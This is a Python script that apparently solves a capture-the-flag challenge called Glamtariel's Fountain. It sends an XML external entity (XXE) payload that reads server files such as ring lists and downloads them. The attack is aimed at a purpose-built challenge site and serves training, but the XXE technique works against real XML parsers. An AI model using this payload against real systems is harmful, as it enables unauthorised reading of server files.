#!/usr/bin/env python
"""Talk to Glamtariel."""
import os
from datetime import datetime
from typing import Optional

import click
import requests
from bs4 import BeautifulSoup
from dotenv import load_dotenv

load_dotenv()
URL = "https://glamtarielsfountain.com/dropped"
TIMEOUT = 10
DELAY = 120
CSRF_TOKEN = None
SESSION = requests.Session()
LOOPS = 3  # 3 series of images

entities = ["princess", "fountain"]
images = ["img4", "img3", "img2", "img1"]
files = [
    "/app/static/images/ringlist.txt",
    "/app/static/images/x_phial_pholder_2022/bluering.txt",
    "/app/static/images/x_phial_pholder_2022/redring.txt",
    "/app/static/images/x_phial_pholder_2022/silverring.txt",
    "/app/static/images/x_phial_pholder_2022/greenring.txt",
    "/app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt",
]


def printc(msg: str, msg_type: str):
    """Pretty print a timestamped message."""
    now = datetime.now()
    timestamp = now.strftime("%Y-%m-%dT%H:%M:%S")
    message = f"{timestamp} - {msg}"
    msg_type_mapper = {
        "INFO": click.style(f"[-] {message}", fg="blue"),
        "SUCCESS": click.style(f"[+] {message}", fg="green"),
        "WARNING": click.style(f"[!] {message}", fg="yellow"),
        "ERROR": click.style(f"[E] {message}", fg="red"),
    }
    click.echo(msg_type_mapper.get(msg_type.upper(), message))


def get_csrf_token(response: requests.Response):
    """Update the value of the CSRF token."""
    global CSRF_TOKEN  # pylint: disable=global-statement

    soup = BeautifulSoup(response.text, "html.parser")
    csrf_id = soup.find("meta", {"id": "csrf"})

    if csrf_id and csrf_id.attrs.get("content", False):
        CSRF_TOKEN = csrf_id.attrs["content"]


def print_response(json_response: dict):
    """Pretty print an entity's response."""
    resp_princess, resp_fountain = (
        json_response["appResp"].replace("\n", " ").split("^")
    )
    printc(f"Image dropped on {json_response['droppedOn']}", "info")
    print(f"Princess: {resp_princess}")
    print(f"Fountain: {resp_fountain}")


def download_file(path: str):
    """Download a file."""
    filename = os.path.basename(path).split(",")[0]
    response = SESSION.get(
        f"https://glamtarielsfountain.com/{path}", headers={"X-Grinchum": CSRF_TOKEN}
    )

    with open(filename, "wb") as fhandle:
        fhandle.write(response.content)

    printc(f"Downloaded: {path}", "WARNING")


def send_json_request(who: str, img: str):
    """Send a JSON request."""
    response = SESSION.post(
        URL,
        timeout=TIMEOUT,
        headers={
            "Content-Type": "application/json",
            "Accept": "application/json",
            "X-Grinchum": CSRF_TOKEN,
        },
        json={"imgDrop": img, "who": who, "reqType": "json"},
    )

    if response.status_code == 200:
        return response.json()
    else:
        return None


def send_xee_xml_request(file: str, img: Optional[str] = None):
    """Send an XML request containing XEE."""
    response = SESSION.post(
        URL,
        timeout=TIMEOUT,
        headers={
            "Content-Type": "application/xml",
            "Accept": "application/json",
            "X-Grinchum": CSRF_TOKEN,
        },
        data=(
            '<?xml version="1.0" encoding="UTF-8" ?>'
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file}" >]>'
            "<root>"
            f"<imgDrop>{img or '&xxe;'}</imgDrop>"
            "<who>princess</who>"
            f"<reqType>{'&xxe;' if img else 'xml'}</reqType>"
            "</root>"
        ),
    )

    if response.status_code == 200:
        return response.json()
    else:
        return None


def start():
    """Main app entry point."""
    # Initial request to get the CSRF token (aka, Ticket)
    response = SESSION.get(URL)
    get_csrf_token(response)

    # Ticket and cookie details
    printc(f"Ticket: {CSRF_TOKEN}", "success")

    for cookie in response.cookies:
        printc(f"Cookie: {cookie}", "success")

    # Send JSON requests to the princess and fountain until asked about 3 image groups
    printc("Sending JSON", "info")

    for _ in range(LOOPS):
        for entity in entities:
            for image in images:
                json_response = send_json_request(entity, image)
                print_response(json_response)

                if json_response["visit"] != "none":
                    download_file(json_response["visit"])

    # Switch over to sending XML requests to the princess
    printc("Switching to XML", "info")

    for file in files:
        xml_response = send_xee_xml_request(file)
        print_response(xml_response)

        if xml_response["visit"] != "none":
            download_file(xml_response["visit"])

    # Final request to share the silver ring and retrieve the gold ring
    printc("Give silver ring", "info")
    xml_response = send_xee_xml_request(files[-1], "img1")
    print_response(xml_response)

    if xml_response["visit"] != "none":
        download_file(xml_response["visit"])


if __name__ == "__main__":
    start()
